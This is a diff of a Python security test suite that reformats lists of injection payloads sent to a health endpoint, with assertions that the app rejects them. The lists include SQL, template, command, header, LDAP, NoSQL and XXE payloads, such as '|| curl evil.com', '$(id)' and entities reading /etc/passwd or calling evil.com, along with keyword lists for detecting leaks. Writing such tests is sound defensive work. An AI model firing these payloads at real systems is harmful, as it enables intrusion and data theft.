@@ -31,7 +31,7 @@ class TestInputValidation:
             "'; DROP TABLE users; --",
             "' OR '1'='1",
             "'; UPDATE users SET admin=1; --",
-            "UNION SELECT * FROM information_schema.tables--"
+            "UNION SELECT * FROM information_schema.tables--",
         ]
 
         for payload in sql_payloads:
@@ -42,13 +42,20 @@ class TestInputValidation:
             assert response.status_code in [200, 400, 404, 422]
 
             # Should not expose database errors
-            if hasattr(response, 'json'):
+            if hasattr(response, "json"):
                 response_data = response.json()
                 error_message = str(response_data).lower()
 
                 dangerous_keywords = [
-                    "sql", "database", "table", "select", "drop",
-                    "mysql", "postgresql", "sqlite", "syntax error"
+                    "sql",
+                    "database",
+                    "table",
+                    "select",
+                    "drop",
+                    "mysql",
+                    "postgresql",
+                    "sqlite",
+                    "syntax error",
                 ]
 
                 for keyword in dangerous_keywords:
@@ -63,7 +70,7 @@ class TestInputValidation:
             "{{''.__class__.__mro__[1].__subclasses__()}}",
             "${7*7}",
             "#{7*7}",
-            "<%=7*7%>"
+            "<%=7*7%>",
         ]
 
         for payload in template_payloads:
@@ -84,7 +91,7 @@ class TestInputValidation:
             "..\\..\\..\\windows\\system32\\config\\system",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2f",  # URL encoded ../../../
             "....//....//....//",
-            "..%252f..%252f..%252f"  # Double URL encoded
+            "..%252f..%252f..%252f",  # Double URL encoded
         ]
 
         for payload in path_payloads:
@@ -97,8 +104,13 @@ class TestInputValidation:
                 # Should not return system file content
                 content = response.text.lower()
                 system_indicators = [
-                    "root:", "bin/bash", "system32", "windows",
-                    "passwd", "shadow", "hosts"
+                    "root:",
+                    "bin/bash",
+                    "system32",
+                    "windows",
+                    "passwd",
+                    "shadow",
+                    "hosts",
                 ]
 
                 for indicator in system_indicators:
@@ -114,7 +126,7 @@ class TestInputValidation:
             "`whoami`",
             "$(id)",
             "; ping google.com",
-            "|| curl evil.com"
+            "|| curl evil.com",
         ]
 
         for payload in command_payloads:
@@ -128,8 +140,13 @@ class TestInputValidation:
 
                 # Should not show command execution results
                 command_outputs = [
-                    "uid=", "gid=", "total ", "drwx", "-rw-",
-                    "ping statistics", "64 bytes from"
+                    "uid=",
+                    "gid=",
+                    "total ",
+                    "drwx",
+                    "-rw-",
+                    "ping statistics",
+                    "64 bytes from",
                 ]
 
                 for output in command_outputs:
@@ -142,7 +159,7 @@ class TestInputValidation:
             "test\r\nX-Injected-Header: malicious",
             "test\nSet-Cookie: admin=true",
             "test%0d%0aLocation: http://evil.com",
-            "test\r\n\r\n<script>alert('xss')</script>"
+            "test\r\n\r\n<script>alert('xss')</script>",
         ]
 
         for payload in header_payloads:
@@ -150,11 +167,7 @@ class TestInputValidation:
             response = client.get("/health", headers={"X-Test": payload})
 
             # Response should not contain injected headers
-            injected_headers = [
-                "x-injected-header",
-                "set-cookie",
-                "location"
-            ]
+            injected_headers = ["x-injected-header", "set-cookie", "location"]
 
             for header in injected_headers:
                 assert header not in [h.lower() for h in response.headers.keys()]
@@ -166,7 +179,7 @@ class TestInputValidation:
             "*)(uid=*",
             "*)))(|(uid=*",
             "admin)(&(password=*))",
-            "*)(&(objectclass=*"
+            "*)(&(objectclass=*",
         ]
 
         for payload in ldap_payloads:
@@ -183,7 +196,7 @@ class TestInputValidation:
             '{"$ne": null}',
             '{"$regex": ".*"}',
             '{"$where": "return true"}',
-            'true, $where: "return true"'
+            'true, $where: "return true"',
         ]
 
         for payload in nosql_payloads:
@@ -198,11 +211,13 @@ class TestInputValidation:
         xml_payloads = [
             '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
             '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><test>&xxe;</test>',
-            '<test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></test>'
+            '<test xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></test>',
         ]
 
         for payload in xml_payloads:
-            response = client.post("/health", data=payload, headers={"Content-Type": "application/xml"})
+            response = client.post(
+                "/health", data=payload, headers={"Content-Type": "application/xml"}
+            )
 
             # Should reject or safely handle XML input
             assert response.status_code in [400, 405, 415, 422]
@@ -222,7 +237,7 @@ class TestInputValidation:
             ("test.jsp", b"<% out.println('test'); %>"),
             ("test.asp", b"<%=now()%>"),
             ("test.exe", b"MZ\x90\x00"),  # PE header
-            ("test.bat", b"@echo off\ndir")
+            ("test.bat", b"@echo off\ndir"),
         ]
 
         for filename, content in malicious_files:
@@ -262,7 +277,7 @@ class TestInputValidation:
             "/health/invalid",
             "/.env",
             "/config",
-            "/admin"
+            "/admin",
         ]
 
         for endpoint in error_endpoints:
@@ -273,9 +288,17 @@ class TestInputValidation:
 
                 # Should not expose sensitive information in errors
                 sensitive_info = [
-                    "traceback", "stack trace", "line ", "file \"",
-                    "database", "connection", "password", "secret",
-                    "internal server error", "debug", "exception"
+                    "traceback",
+                    "stack trace",
+                    "line ",
+                    'file "',
+                    "database",
+                    "connection",
+                    "password",
+                    "secret",
+                    "internal server error",
+                    "debug",
+                    "exception",
                 ]
 
                 for info in sensitive_info:
